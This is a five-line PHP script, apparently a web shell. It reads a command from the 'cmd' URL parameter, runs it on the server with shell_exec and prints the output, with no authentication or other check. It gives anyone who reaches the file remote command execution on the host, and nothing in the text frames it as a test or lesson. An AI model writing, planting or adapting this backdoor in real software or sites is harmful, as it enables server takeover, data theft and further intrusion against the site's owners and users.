<?php 
$test = $_GET['cmd']; 
$result = shell_exec($test); 
var_dump($result);
?>